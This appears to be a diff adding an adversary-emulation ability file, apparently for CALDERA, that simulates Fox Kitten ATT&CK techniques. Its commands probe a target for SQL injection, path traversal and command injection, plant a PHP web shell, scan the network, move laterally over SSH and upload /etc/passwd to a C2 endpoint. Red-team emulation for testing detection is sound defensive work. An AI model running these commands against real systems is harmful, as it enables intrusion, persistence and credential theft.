@@ -1,0 +1,202 @@
+[
+    {
+        "ability_id": "1a1b2c3d-0000-1111-2222-abcdef000001",
+        "name": "Exploit public-facing application (placeholder)",
+        "tactic": "initial-access",
+        "technique_name": "Exploit Public-Facing Application",
+        "technique_id": "T1190",
+        "description": "Fox Kitten T1190 simulation",
+        "executors": [
+            {
+                "name": "sh",
+                "platform": "linux",
+                "command": "bash -c 'echo \"Simulating T1190 - Multi-stage exploitation attempt\"; echo \"[+] Scanning for common endpoints\"; ENDPOINTS=(\"/admin\" \"/wp-admin\" \"/console\" \"/.env\" \"/config.json\"); for endpoint in \"${ENDPOINTS[@]}\"; do curl -s -o /dev/null -w \"%{http_code} %{url_effective}\\n\" \"http://${TARGET}${endpoint}\"; done; echo \"[+] Probing for common vulnerabilities\"; curl -s \"http://${TARGET}/?id=1'\"'\"' OR '\"'\"'1'\"'\"'='\"'\"'1\" -o /dev/null; curl -s \"http://${TARGET}/../../etc/passwd\" -o /dev/null; echo \"[+] Attempting command injection\"; curl -s \"http://${TARGET}/ping?ip=127.0.0.1;whoami\" -o /dev/null; echo \"T1190 simulation complete - Check your detection logs\"'"
+            }
+        ]
+    },
+    {
+        "ability_id": "1a1b2c3d-0000-1111-2222-abcdef000002",
+        "name": "Use valid accounts",
+        "tactic": "persistence",
+        "technique_name": "Valid Accounts",
+        "technique_id": "T1078",
+        "description": "Fox Kitten T1078 simulation",
+        "executors": [
+            {
+                "name": "sh",
+                "platform": "linux",
+                "command": "grep www-data /etc/passwd | cut -d\":\" -f 1",
+                "parsers": [
+                    {
+                        "module": "plugins.stockpile.app.parsers.basic",
+                        "parserconfigs": [
+                            {
+                                "source": "host.username"
+                            }
+                        ]
+                    }
+                ]
+            }
+        ]
+    },
+    {
+        "ability_id": "1a1b2c3d-0000-1111-2222-abcdef000003",
+        "name": "Command and scripting interpreter",
+        "tactic": "execution",
+        "technique_name": "Command and Scripting Interpreter",
+        "technique_id": "T1059",
+        "description": "Fox Kitten T1059 simulation",
+        "executors": [
+            {
+                "name": "sh",
+                "platform": "linux",
+                "command": "echo 'Hello from T1059' > /tmp/t1059.txt"
+            }
+        ]
+    },
+    {
+        "ability_id": "1a1b2c3d-0000-1111-2222-abcdef000004",
+        "name": "Deploy server component",
+        "tactic": "persistence",
+        "technique_name": "Server Software Component",
+        "technique_id": "T1505",
+        "description": "Fox Kitten T1505 simulation",
+        "executors": [
+            {
+                "name": "sh",
+                "platform": "linux",
+                "command": "echo '<?php if(isset($_GET[\"cmd\"])) { system($_GET[\"cmd\"]); } ?>' > /var/www/html/shell.php"
+            }
+        ]
+    },
+    {
+        "ability_id": "1a1b2c3d-0000-1111-2222-abcdef000005",
+        "name": "Account discovery",
+        "tactic": "discovery",
+        "technique_name": "Account Discovery",
+        "technique_id": "T1087",
+        "description": "Fox Kitten T1087 simulation",
+        "executors": [
+            {
+                "name": "sh",
+                "platform": "linux",
+                "command": "cut -d: -f1 /etc/passwd | head -5"
+            }
+        ]
+    },
+    {
+        "ability_id": "1a1b2c3d-0000-1111-2222-abcdef000006",
+        "name": "System network configuration discovery",
+        "tactic": "discovery",
+        "technique_name": "System Network Configuration Discovery",
+        "technique_id": "T1016",
+        "description": "Fox Kitten T1016 simulation",
+        "executors": [
+            {
+                "name": "sh",
+                "platform": "linux",
+                "command": "ip route | awk '/default/ {print $3}'",
+                "parsers": [
+                    {
+                        "module": "plugins.stockpile.app.parsers.basic",
+                        "parserconfigs": [
+                            {
+                                "source": "host.gateway"
+                            }
+                        ]
+                    }
+                ]
+            }
+        ]
+    },
+    {
+        "ability_id": "1a1b2c3d-0000-1111-2222-abcdef000007",
+        "name": "Network service discovery",
+        "tactic": "discovery",
+        "technique_name": "Network Service Discovery",
+        "technique_id": "T1046",
+        "description": "Fox Kitten T1046 simulation",
+        "executors": [
+            {
+                "name": "sh",
+                "platform": "linux",
+                "command": "nmap -sn 192.168.15.0/24 || echo 'Simulate network scan'"
+            }
+        ]
+    },
+    {
+        "ability_id": "1a1b2c3d-0000-1111-2222-abcdef000008",
+        "name": "Lateral movement",
+        "tactic": "lateral-movement",
+        "technique_name": "Remote Services",
+        "technique_id": "T1021",
+        "description": "Fox Kitten T1021 simulation",
+        "executors": [
+            {
+                "name": "sh",
+                "platform": "linux",
+                "command": "ssh -o BatchMode=yes -o ConnectTimeout=5 -o StrictHostKeyChecking=no #{host.username}@#{host.gateway}"
+            }
+        ]
+    },
+    {
+        "ability_id": "1a1b2c3d-0000-1111-2222-abcdef000009",
+        "name": "Application layer protocol",
+        "tactic": "command-and-control",
+        "technique_name": "Application Layer Protocol",
+        "technique_id": "T1071.001",
+        "description": "Fox Kitten T1071 simulation",
+        "executors": [
+            {
+                "name": "sh",
+                "platform": "linux",
+                "command": "curl -s https://example.com/ping || echo 'Simulate HTTPS C2'"
+            }
+        ]
+    },
+    {
+        "ability_id": "1a1b2c3d-0000-1111-2222-abcdef000010",
+        "name": "Proxy usage",
+        "tactic": "command-and-control",
+        "technique_name": "Proxy",
+        "technique_id": "T1090",
+        "description": "Fox Kitten T1090 simulation",
+        "executors": [
+            {
+                "name": "sh",
+                "platform": "linux",
+                "command": "echo \"ssh -D 6777  -o BatchMode=yes -o ConnectTimeout=5 -o StrictHostKeyChecking=no -N roth@localhost - Will run a C2 over SSH\""
+            }
+        ]
+    },
+    {
+        "ability_id": "1a1b2c3d-0000-1111-2222-abcdef000011",
+        "name": "Exfiltration over C2 channel",
+        "tactic": "exfiltration",
+        "technique_name": "Exfiltration Over C2 Channel",
+        "technique_id": "T1041",
+        "description": "Fox Kitten T1041 simulation",
+        "executors": [
+            {
+                "name": "sh",
+                "platform": "linux",
+                "command": "curl -F \"file=@/etc/passwd\" -H \"X-Request-ID: #{paw}\" -H \"key: ADMIN123\" http://0.0.0.0:8888/file/upload"
+            }
+        ]
+    },
+    {
+        "ability_id": "1a1b2c3d-0000-1111-2222-abcdef000012",
+        "name": "File deletion / cleanup",
+        "tactic": "defense-evasion",
+        "technique_name": "File Deletion",
+        "technique_id": "T1107",
+        "description": "Fox Kitten T1107 simulation",
+        "executors": [
+            {
+                "name": "sh",
+                "platform": "linux",
+                "command": "rm -f /var/www/html/shell.php 2>/dev/null || echo 'All cleaned!'"
+            }
+        ]
+    }
+]
